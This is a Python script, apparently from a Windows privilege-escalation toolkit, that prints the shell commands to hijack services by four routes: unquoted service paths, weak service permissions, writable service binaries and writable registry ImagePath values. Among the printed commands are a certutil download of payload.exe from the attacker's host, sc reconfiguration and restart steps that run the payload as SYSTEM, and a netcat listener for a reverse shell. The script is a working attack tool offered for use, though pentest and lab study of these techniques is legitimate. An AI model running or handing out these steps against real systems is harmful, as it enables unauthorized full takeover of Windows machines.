#!/usr/bin/env python3
"""SERVICE privesc: unquoted service paths + weak service perms (modifiable binPath).
PRINTS the target-side shell commands to plant a payload.exe and restart the service so it runs
AS THE SERVICE ACCOUNT (usually SYSTEM). You run these from your low-priv foothold shell on the target.
Build the exe first with gen_payload.py. Edit LHOST/LPORT in _winpriv_common.py.

Usage:
  # unquoted path — plant a hijack exe at the space-truncated name Windows tries first:
  python3 gen_service.py --binpath "C:\\Program Files\\My App\\svc.exe" [--service MyService]

  # weak SC perms — you hold SERVICE_CHANGE_CONFIG; repoint binPath:
  python3 gen_service.py --mode binpath --service MyService [--payload C:\\Windows\\Temp\\payload.exe]
  # writable service EXE on disk — just overwrite the file (no SC perms needed):
  python3 gen_service.py --mode writable_binary --service MyService [--payload ...]
  # writable service REGISTRY key — repoint ImagePath directly:
  python3 gen_service.py --mode reg_imagepath --service MyService [--payload ...]
"""
import sys
import _winpriv_common as P

def die(m): print(m); sys.exit(1)
def opt(flag, default=None):
    return sys.argv[sys.argv.index(flag) + 1] if flag in sys.argv else default

mode    = opt("--mode", "unquoted")
service = opt("--service", "<ServiceName>")
payload = opt("--payload", "C:\\Windows\\Temp\\payload.exe")

print(f"# ENUM the box first (from your foothold):")
print(f'#   unquoted:   wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\\Windows\\\\"')
print(f"#   weak perms: accesschk.exe -uwcqv <youruser> * 2>nul   (or PowerUp Get-ModifiableService)")
print(f"#   restart?:   check you can sc stop/start it, else it fires on the next reboot\n")

if mode == "unquoted":
    binpath = opt("--binpath")
    if not binpath: die("--binpath \"C:\\Program Files\\...\\svc.exe\" is required for unquoted mode")
    cands = P.unquoted_candidates(binpath)
    if not cands:
        die("no unquoted-hijack candidate — that path has no space before the .exe (not exploitable this way).")
    print(f"# UNQUOTED SERVICE PATH: {binpath}")
    print(f"# Windows tries these IN ORDER — plant payload.exe at the FIRST one whose PARENT dir you can write:")
    for c in cands:
        parent = c.rsplit("\\", 1)[0] or c
        print(f'#   candidate: {c}      (check: icacls "{parent}"  -> want (W)/(M)/(F) for your group/Users)')
    tgt = cands[-1]              # deepest candidate = most likely to be a writable app subdir
    print(f"\n# build:  python3 gen_payload.py exe --action revshell   (or --action add_admin)")
    print(f"# deliver payload.exe to the plant path (pick a writable candidate; example uses the deepest one):")
    print(f'certutil -urlcache -f http://{P.LHOST}/payload.exe "{tgt}"   REM HTTP; or base64/SMB — see the cheatsheet')
    print(f"# trigger (need restart rights, else wait for reboot):")
    print(f"sc stop {service} & sc start {service}")
    print(f"# ^ the service starts YOUR {tgt} as the service account (usually SYSTEM).")

elif mode == "binpath":
    print(f"# WEAK SERVICE PERMS (you hold SERVICE_CHANGE_CONFIG on {service}) — just repoint the binary:")
    print(f"# build + deliver payload.exe to {payload} first (gen_payload.py exe ; certutil/SMB).")
    print(f'sc config {service} binPath= "{payload}"    REM NOTE the space after binPath= is REQUIRED')
    print(f"sc stop {service} & sc start {service}")
    print(f"# restore afterwards:  sc config {service} binPath= \"<original path>\"")
    print(f"# ^ simplest & most reliable service misconfig when you can reconfigure it.")

elif mode == "writable_binary":
    print(f"# WRITABLE SERVICE BINARY — the service EXE file itself is writable by you (no SC perms needed).")
    print(f"# find it:  accesschk.exe -quvw <youruser> <path-to-service.exe>   (want FILE_ALL_ACCESS / (W))")
    print(f"# 1) back up + overwrite the on-disk binary with your payload.exe (deliver it first, gen_payload.py exe):")
    print(f'copy "<service.exe>" "<service.exe>.bak"  &  copy /y {payload} "<service.exe>"')
    print(f"# 2) restart (or wait for reboot / next start):")
    print(f"sc stop {service} & sc start {service}")
    print(f"# 3) restore:  copy /y \"<service.exe>.bak\" \"<service.exe>\"")
    print(f"# ^ no reconfig — you just replaced the file the SCM runs as SYSTEM. Very common (sloppy install ACLs).")

elif mode == "reg_imagepath":
    print(f"# WEAK SERVICE REGISTRY ACL — you can write the service's ImagePath value directly (even without SERVICE_CHANGE_CONFIG).")
    print(f"# find it:  accesschk.exe -kvuqsw <youruser> hklm\\System\\CurrentControlSet\\Services  (want KEY_WRITE/(W) on a service key)")
    print(f'reg add "HKLM\\System\\CurrentControlSet\\Services\\{service}" /v ImagePath /t REG_EXPAND_SZ /d "{payload}" /f')
    print(f"sc stop {service} & sc start {service}")
    print(f"# restore the original ImagePath afterwards. ^ the registry ACL path when SC config is denied but the key is writable.")

else:
    die("mode must be 'unquoted' | 'binpath' | 'writable_binary' | 'reg_imagepath'")

print(f"\n# if action=revshell:  nc -lvnp {P.LPORT} on the attacker first.")
